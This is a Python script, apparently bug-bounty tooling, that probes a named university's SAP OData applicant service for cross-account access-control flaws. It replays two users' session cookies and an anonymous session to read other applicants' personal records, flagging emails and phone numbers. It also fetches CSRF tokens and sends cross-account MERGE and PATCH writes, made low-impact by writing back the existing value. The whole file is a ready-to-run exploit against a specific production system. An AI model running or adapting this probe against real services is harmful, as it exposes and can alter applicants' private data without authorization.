#!/usr/bin/env python3
"""Manual probe for OData write authorization gaps (cross-account BAC)."""

from __future__ import annotations

import argparse
import json
import os
import ssl
import re
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen


DEFAULT_SERVICE_BASE = "https://webwsp.aps.kuleuven.be/sap/opu/odata/sap/ZC_AD_APPLICANT_SRV"
DEFAULT_ENV_FILE = ".env"
APPLICANT_NAVS = (
    "",
    "PersInfos",
    "Addresses",
    "Curriculums",
    "Languages",
    "Scholarships",
    "Applications",
    "ApplicantPhotos",
)
IN_ACCOUNT_ID_RE = re.compile(r"IN\\d{6,}")


@dataclass
class HttpResult:
    status: int
    headers: dict[str, str]
    body: bytes
    error: str = ""

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", "ignore")

    @property
    def content_type(self) -> str:
        return str(self.headers.get("Content-Type", ""))


def read_env_file(path: Path) -> dict[str, str]:
    if not path.exists():
        return {}
    out: dict[str, str] = {}
    for raw in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        key = key.strip()
        value = value.strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        out[key] = value
    return out


def env_get(name: str, env_file_values: dict[str, str]) -> str:
    runtime_value = os.getenv(name, "").strip()
    if runtime_value:
        return runtime_value
    return env_file_values.get(name, "").strip()


def http_request(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
    timeout: int = 8,
) -> HttpResult:
    req = Request(url, data=body, method=method)
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    ctx = ssl.create_default_context()
    try:
        with urlopen(req, timeout=timeout, context=ctx) as resp:
            raw_headers = {k: v for k, v in resp.headers.items()}
            return HttpResult(status=int(resp.status), headers=raw_headers, body=resp.read())
    except HTTPError as err:
        raw_headers = {k: v for k, v in err.headers.items()} if err.headers else {}
        return HttpResult(status=int(err.code), headers=raw_headers, body=err.read(), error=f"http_error_{err.code}")
    except URLError as err:
        return HttpResult(status=0, headers={}, body=str(err).encode("utf-8", "ignore"), error=f"url_error:{err}")
    except Exception as err:  # pragma: no cover - defensive fallback
        return HttpResult(status=0, headers={}, body=str(err).encode("utf-8", "ignore"), error=f"unexpected:{err}")


def looks_like_login_page(result: HttpResult) -> bool:
    text = result.text.lower()
    if "text/html" not in result.content_type.lower():
        return False
    signals = (
        "logon failed",
        "aanmelding mislukt",
        "welcome to ku leuven association",
        "saml2",
        "idp.kuleuven.be",
    )
    return any(s in text for s in signals)


def first_line(text: str, limit: int = 180) -> str:
    line = " ".join(text.splitlines()).strip()
    return line[:limit]


def odata_entity_url(service_base: str, entity_set: str, key: str) -> str:
    return f"{service_base}/{entity_set}('{quote(key, safe='')}')?$format=json&sap-client=200"


def parse_json_body(result: HttpResult) -> dict[str, Any] | list[Any] | None:
    try:
        return json.loads(result.text)
    except Exception:
        return None


def is_json_response(result: HttpResult, payload: Any | None = None) -> bool:
    content_type = result.content_type.lower()
    if "json" in content_type:
        return True
    if payload is not None:
        return isinstance(payload, (dict, list))
    return isinstance(parse_json_body(result), (dict, list))


def has_nonempty_odata_data(payload: Any | None) -> bool:
    if not isinstance(payload, dict):
        return False
    data = payload.get("d")
    if isinstance(data, list):
        return len(data) > 0
    if isinstance(data, dict):
        results = data.get("results")
        if isinstance(results, list):
            return len(results) > 0
        return len(data.keys()) > 0
    return False


def extract_resolved_account_id(payload: Any | None) -> str:
    if not isinstance(payload, dict):
        return ""
    data = payload.get("d")
    if not isinstance(data, dict):
        return ""

    explicit = str(data.get("inAccountId", "")).strip()
    if explicit:
        return explicit

    md = data.get("__metadata")
    if isinstance(md, dict):
        meta_id = str(md.get("id", "")) or str(md.get("uri", ""))
        if meta_id:
            match = IN_ACCOUNT_ID_RE.search(meta_id)
            if match:
                return match.group(0)
    return ""


def effective_write_success(result: HttpResult) -> bool:
    if result.status not in {200, 201, 202, 204}:
        return False
    if looks_like_login_page(result):
        return False
    if result.status == 204:
        return True
    payload = parse_json_body(result)
    return is_json_response(result, payload=payload)


def odata_applicant_resource_url(service_base: str, applicant_id: str, nav: str = "") -> str:
    base = f"{service_base}/Applicants('{quote(applicant_id, safe='')}')"
    if nav:
        base = f"{base}/{nav}"
    return f"{base}?$format=json&sap-client=200"


def discover_applicant_id(service_base: str, cookie: str) -> str:
    url = f"{service_base}/Applicants?$top=1&$format=json&sap-client=200"
    headers = {
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Cookie": cookie,
    }
    resp = http_request("GET", url, headers=headers)
    payload = parse_json_body(resp)
    if not isinstance(payload, dict):
        return ""
    data = payload.get("d")
    if not isinstance(data, dict):
        return ""
    results = data.get("results")
    if not isinstance(results, list) or not results:
        return ""
    first = results[0]
    if not isinstance(first, dict):
        return ""
    return str(first.get("inAccountId", "")).strip()


def fetch_csrf_token(service_base: str, cookie: str) -> tuple[str, HttpResult]:
    url = f"{service_base}/?sap-client=200"
    headers = {
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "x-csrf-token": "Fetch",
        "Cookie": cookie,
    }
    resp = http_request("HEAD", url, headers=headers)
    token = str(resp.headers.get("x-csrf-token", "")).strip()
    return token, resp


def attempt_merge(
    service_base: str,
    applicant_id: str,
    cookie: str,
    csrf_token: str,
    payload: dict[str, Any],
) -> HttpResult:
    url = odata_entity_url(service_base, "Applicants", applicant_id)
    body = json.dumps(payload, ensure_ascii=True).encode("utf-8")
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "x-csrf-token": csrf_token,
        "If-Match": "*",
        "X-HTTP-Method": "MERGE",
        "Cookie": cookie,
    }
    return http_request("POST", url, headers=headers, body=body)


def attempt_patch(
    service_base: str,
    applicant_id: str,
    cookie: str,
    csrf_token: str,
    payload: dict[str, Any],
) -> HttpResult:
    url = odata_entity_url(service_base, "Applicants", applicant_id)
    body = json.dumps(payload, ensure_ascii=True).encode("utf-8")
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "x-csrf-token": csrf_token,
        "If-Match": "*",
        "Cookie": cookie,
    }
    return http_request("PATCH", url, headers=headers, body=body)


def save_report(out_dir: Path, rows: dict[str, Any]) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    json_path = out_dir / f"write_bac_probe_{stamp}.json"
    md_path = out_dir / f"write_bac_probe_{stamp}.md"
    json_path.write_text(json.dumps(rows, ensure_ascii=False, indent=2), encoding="utf-8")

    lines: list[str] = []
    lines.append(f"# OData Write BAC Probe - {stamp}")
    lines.append("")
    lines.append(f"- service_base: `{rows.get('service_base', '')}`")
    lines.append(f"- cookie_a_len: `{rows.get('cookie_a_len', 0)}`")
    lines.append(f"- cookie_b_len: `{rows.get('cookie_b_len', 0)}`")
    lines.append("")

    lines.append("## Auth Check")
    for label, info in rows.get("auth_check", {}).items():
        lines.append(
            f"- {label}: status={info.get('status')} ctype={info.get('content_type')} "
            f"login_like={info.get('login_like')} sample=`{info.get('sample', '')}`"
        )
    lines.append("")

    lines.append("## Read Matrix (Applicants + sub-resources)")
    for item in rows.get("reads", []):
        lines.append(
            f"- actor={item.get('actor')} relation={item.get('relation')} target_id={item.get('target_id')} "
            f"resource={item.get('resource')} status={item.get('status')} json={item.get('json')} "
            f"nonempty_data={item.get('nonempty_data')} login_like={item.get('login_like')} "
            f"resolved_id={item.get('resolved_account_id')} owner_id={item.get('owner_account_id')} "
            f"has_email={item.get('has_email')} has_phone={item.get('has_phone')} potential_read_bac={item.get('potential_read_bac')}"
        )
    lines.append("")

    lines.append("## Write Matrix (MERGE/PATCH)")
    for item in rows.get("writes", []):
        lines.append(
            f"- actor={item.get('actor')} target_id={item.get('target_id')} relation={item.get('relation')} "
            f"merge={item.get('merge_status')} patch={item.get('patch_status')} "
            f"csrf_present={item.get('csrf_present')} potential_vuln={item.get('potential_vuln')}"
        )
    lines.append("")

    lines.append("## Verdict")
    lines.append(f"- auth_ready: `{rows.get('auth_ready', False)}`")
    lines.append(f"- potential_read_bac: `{rows.get('potential_read_bac', False)}`")
    lines.append(f"- potential_write_bac: `{rows.get('potential_write_bac', False)}`")
    lines.append(f"- notes: `{rows.get('notes', '')}`")
    lines.append("")

    md_path.write_text("\n".join(lines), encoding="utf-8")
    return md_path


def main() -> int:
    parser = argparse.ArgumentParser(description="Probe OData write BAC (cross-account data modification).")
    parser.add_argument("--service-base", default=DEFAULT_SERVICE_BASE)
    parser.add_argument("--env-file", default=DEFAULT_ENV_FILE)
    parser.add_argument("--id-a", default="")
    parser.add_argument("--id-b", default="")
    parser.add_argument("--extra-id", default="")
    parser.add_argument("--out-dir", default="reports/research/manual_checks")
    parser.add_argument("--force-when-auth-fails", action="store_true")
    args = parser.parse_args()

    env_file_values = read_env_file(Path(args.env_file))
    cookie_a = env_get("HUNTEROPS_USER_COOKIE", env_file_values)
    cookie_b = env_get("HUNTEROPS_USER_B_COOKIE", env_file_values)
    cookie_anon = ""

    profile_cookie = {
        "A": cookie_a,
        "B": cookie_b,
        "ANON": cookie_anon,
    }

    auth_check: dict[str, Any] = {}
    for label, cookie in profile_cookie.items():
        url = f"{args.service_base}/?sap-client=200"
        headers = {"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}
        if cookie:
            headers["Cookie"] = cookie
        resp = http_request("GET", url, headers=headers)
        auth_check[label] = {
            "status": resp.status,
            "content_type": resp.content_type,
            "login_like": looks_like_login_page(resp),
            "sample": first_line(resp.text),
        }

    auth_ready = (
        auth_check.get("A", {}).get("status") == 200
        and auth_check.get("B", {}).get("status") == 200
        and not bool(auth_check.get("A", {}).get("login_like"))
        and not bool(auth_check.get("B", {}).get("login_like"))
    )

    id_a = str(args.id_a).strip() or discover_applicant_id(args.service_base, cookie_a)
    id_b = str(args.id_b).strip() or discover_applicant_id(args.service_base, cookie_b)
    ids: list[str] = []
    for value in (id_a, id_b, str(args.extra_id).strip()):
        if value and value not in ids:
            ids.append(value)

    reads: list[dict[str, Any]] = []
    potential_read_bac = False
    owner_ids: dict[str, str] = {}
    for actor, cookie in profile_cookie.items():
        for target_id in ids:
            relation = "unauthenticated"
            if actor == "A":
                relation = "own_account" if target_id == id_a else "cross_account"
            elif actor == "B":
                relation = "own_account" if target_id == id_b else "cross_account"

            for nav in APPLICANT_NAVS:
                url = odata_applicant_resource_url(args.service_base, target_id, nav=nav)
                headers = {"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}
                if cookie:
                    headers["Cookie"] = cookie
                resp = http_request("GET", url, headers=headers)
                payload = parse_json_body(resp)
                is_json = is_json_response(resp, payload)
                nonempty_data = has_nonempty_odata_data(payload)
                login_like = looks_like_login_page(resp)
                resolved_account_id = extract_resolved_account_id(payload)
                if actor in {"A", "B"} and relation == "own_account" and nav == "Applicants" and resolved_account_id:
                    owner_ids[actor] = resolved_account_id

                owner_id = owner_ids.get(actor, "")
                hit = False
                if (
                    actor in {"A", "B"}
                    and relation == "cross_account"
                    and resp.status == 200
                    and is_json
                    and nonempty_data
                    and not login_like
                ):
                    # Only flag BAC when response resolves to victim account, not to caller's own account.
                    if resolved_account_id and resolved_account_id == target_id and resolved_account_id != owner_id:
                        hit = True
                if hit:
                    potential_read_bac = True
                reads.append(
                    {
                        "actor": actor,
                        "relation": relation,
                        "target_id": target_id,
                        "resource": nav or "Applicants",
                        "status": resp.status,
                        "json": is_json,
                        "nonempty_data": nonempty_data,
                        "login_like": login_like,
                        "resolved_account_id": resolved_account_id,
                        "owner_account_id": owner_id,
                        "has_email": '"email"' in resp.text,
                        "has_phone": '"permTelephone"' in resp.text,
                        "sample": first_line(resp.text),
                        "potential_read_bac": hit,
                    }
                )

    tokens: dict[str, str] = {}
    for actor, cookie in (("A", cookie_a), ("B", cookie_b), ("ANON", cookie_anon)):
        token, _ = fetch_csrf_token(args.service_base, cookie)
        tokens[actor] = token

    writes: list[dict[str, Any]] = []
    write_plan: list[tuple[str, str, str]] = []
    if id_a and id_b:
        write_plan.append(("A", id_b, "cross_account"))
        write_plan.append(("B", id_a, "cross_account"))
    if id_a:
        write_plan.append(("ANON", id_a, "unauthenticated"))
        write_plan.append(("A", id_a, "own_account"))
    if id_b:
        write_plan.append(("B", id_b, "own_account"))

    potential_write_bac = False
    if auth_ready or args.force_when_auth_fails:
        for actor, target_id, relation in write_plan:
            cookie = profile_cookie.get(actor, "")
            csrf_token = tokens.get(actor, "")
            get_url = odata_entity_url(args.service_base, "Applicants", target_id)
            get_headers = {"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}
            if cookie:
                get_headers["Cookie"] = cookie
            base_read = http_request("GET", get_url, headers=get_headers)
            parsed = parse_json_body(base_read)
            same_value = "N"
            if isinstance(parsed, dict):
                dct = parsed.get("d")
                if isinstance(dct, dict):
                    same_value = str(dct.get("voorkeurstaal", "N") or "N")
            payload = {"voorkeurstaal": same_value}

            merge_resp = attempt_merge(args.service_base, target_id, cookie, csrf_token, payload)
            patch_resp = attempt_patch(args.service_base, target_id, cookie, csrf_token, payload)
            merge_ok = effective_write_success(merge_resp)
            patch_ok = effective_write_success(patch_resp)
            probe_hit = relation != "own_account" and (merge_ok or patch_ok)
            if probe_hit:
                potential_write_bac = True
            writes.append(
                {
                    "actor": actor,
                    "target_id": target_id,
                    "relation": relation,
                    "csrf_present": bool(csrf_token),
                    "merge_status": merge_resp.status,
                    "merge_sample": first_line(merge_resp.text),
                    "merge_login_like": looks_like_login_page(merge_resp),
                    "patch_status": patch_resp.status,
                    "patch_sample": first_line(patch_resp.text),
                    "patch_login_like": looks_like_login_page(patch_resp),
                    "potential_vuln": probe_hit,
                }
            )
    else:
        writes.append(
            {
                "actor": "SYSTEM",
                "target_id": "",
                "relation": "skipped",
                "csrf_present": False,
                "merge_status": 0,
                "merge_sample": "write probes skipped because auth session is not ready",
                "merge_login_like": False,
                "patch_status": 0,
                "patch_sample": "write probes skipped because auth session is not ready",
                "patch_login_like": False,
                "potential_vuln": False,
            }
        )

    notes = ""
    if not auth_ready:
        notes = "Authenticated sessions appear stale or redirected to login; refresh cookies from a successful $batch 202 request."
    elif not ids:
        notes = "Could not discover applicant IDs automatically; provide --id-a and --id-b from each account."
    elif potential_read_bac and potential_write_bac:
        notes = "Cross-account read and write signals detected. Validate with controlled PoC and immediate revert strategy."
    elif potential_write_bac:
        notes = "Cross-account write seems accepted. Validate with controlled PoC and immediate revert strategy."
    elif potential_read_bac:
        notes = "Cross-account read seems accepted on Applicants resource graph. Prepare BAC report with side-by-side evidence."
    else:
        notes = "No cross-account BAC accepted in this probe set."

    report = {
        "service_base": args.service_base,
        "cookie_a_len": len(cookie_a),
        "cookie_b_len": len(cookie_b),
        "discovered_id_a": id_a,
        "discovered_id_b": id_b,
        "auth_ready": auth_ready,
        "auth_check": auth_check,
        "reads": reads,
        "writes": writes,
        "potential_read_bac": potential_read_bac,
        "potential_write_bac": potential_write_bac,
        "notes": notes,
    }
    out_path = save_report(Path(args.out_dir), report)

    print("write_bac_probe_completed")
    print(f"report_md={out_path}")
    print(f"potential_write_bac={potential_write_bac}")
    print(f"notes={notes}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
